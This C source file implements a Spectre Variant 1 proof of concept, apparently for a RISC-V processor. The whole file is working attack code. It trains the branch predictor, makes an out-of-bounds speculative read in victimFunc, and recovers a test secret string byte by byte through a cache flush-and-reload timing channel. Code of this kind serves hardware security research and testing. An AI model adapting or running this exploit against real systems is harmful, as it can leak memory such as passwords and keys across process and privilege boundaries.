#include "printf.c"
#include "cache.h"
#include <stdint.h>

#define TRAIN_TIMES 14 // assumption is that you have a 2 or 3 bit counter in the predictor
#define ROUNDS 1 // run the train + attack sequence X amount of times (for redundancy)
#define ATTACK_SAME_ROUNDS 10 // amount of times to attack the same index
#define SECRET_SZ 26
#define CACHE_HIT_THRESHOLD 50

#include "pwntools.c"

uint64_t array1_sz = 16;
uint8_t unused1[64];
uint8_t array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
uint8_t unused2[64];
uint8_t array2[256 * L1_BLOCK_SZ_BYTES];
char* secretString = "!\"#ThisIsTheBabyBoomerTest";

void load_secret_in_cache(){
    uint8_t dummy;
    for (int i = 0; i < SECRET_SZ; ++i)
        dummy = secretString[i];
}

/**
 * takes in an idx to use to access a secret array. this idx is used to read any mem addr outside
 * the bounds of the array through the Spectre Variant 1 attack.
 *
 * @input idx input to be used to idx the array
 */
void victimFunc(uint64_t idx, uint64_t sz){
    uint8_t dummy;
    
    if (idx < sz){
        dummy = array2[array1[idx] * L1_BLOCK_SZ_BYTES];
        return;
    }
}

int main(void){
    uint64_t attackIdx = (uint64_t)(secretString - (char*)array1);
    uint64_t start, diff, passInIdx, randIdx;
    uint8_t dummy = 0;
    static uint64_t results[256];

    // try to read out the secret
    for(uint64_t len = 0; len < SECRET_SZ; ++len){
        printf("Searching for secret #%d, addr:0x%x, value(dec):%d, array1:0x%x, array2:0x%x\n", len, secretString+len, secretString[len], array1, array2);

        // clear results every round
        for(uint64_t cIdx = 0; cIdx < 256; ++cIdx){
            results[cIdx] = 0;
        }

        // run the attack on the same idx ATTACK_SAME_ROUNDS times
        for(uint64_t atkRound = 0; atkRound < ATTACK_SAME_ROUNDS; ++atkRound){

            // make sure array you read from is not in the cache
            flushCache((uint64_t)&array2, sizeof(array2));
            randIdx = atkRound % array1_sz;

            for(int64_t j = ((TRAIN_TIMES+1)*ROUNDS)-1; j >= 0; --j){
                // bit twiddling to set passInIdx=randIdx or to attackIdx after TRAIN_TIMES iterations
                // avoid jumps in case those tip off the branch predictor
                // note: randIdx changes everytime the atkRound changes so that the tally does not get affected
                //       training creates a false hit in array2 for that array1 value (you want this to be ignored by having it changed)
                passInIdx = ((j % (TRAIN_TIMES+1)) - 1) & ~0xFFFF; // after every TRAIN_TIMES set passInIdx=...FFFF0000 else 0
                passInIdx = (passInIdx | (passInIdx >> 16)); // set the passInIdx=-1 or 0
                passInIdx = randIdx ^ (passInIdx & (attackIdx ^ randIdx)); // select randIdx or attackIdx 

                // set of constant takens to make the BHR be in a all taken state
                for(volatile uint64_t k = 0; k < 30; ++k){
                    asm("");
                }

                // call function to train or attack
                victimFunc(passInIdx, array1_sz);
            }
            
            // read out array 2 and see the hit secret value
            // this is also assuming there is no prefetching
            for (uint64_t i = 0; i < 256; ++i){
                uint64_t mix_i = ((i * 167) + 13) & 255;
                start = get_mcycle();
                dummy &= array2[mix_i * L1_BLOCK_SZ_BYTES];
                diff = (get_mcycle() - start);
                if ( diff < CACHE_HIT_THRESHOLD ){ 
                    results[mix_i] += 1;
                }
            }
        }
        
        // get highest and second highest result hit values
        uint8_t output[2];
        uint64_t hitArray[2];
        topTwoIdx(results, 256, output, hitArray);
        // printIndexStats(results, 256);

        printf("m[0x%x] = want(%c) =?= guess(hits,dec,char) 1.(%d, %d, %c) 2.(%d, %d, %c)\n", (uint8_t*)(array1 + attackIdx), secretString[len], hitArray[0], output[0], output[0], hitArray[1], output[1], output[1]); 

        // read in the next secret 
        ++attackIdx;
    }

    return 1;
}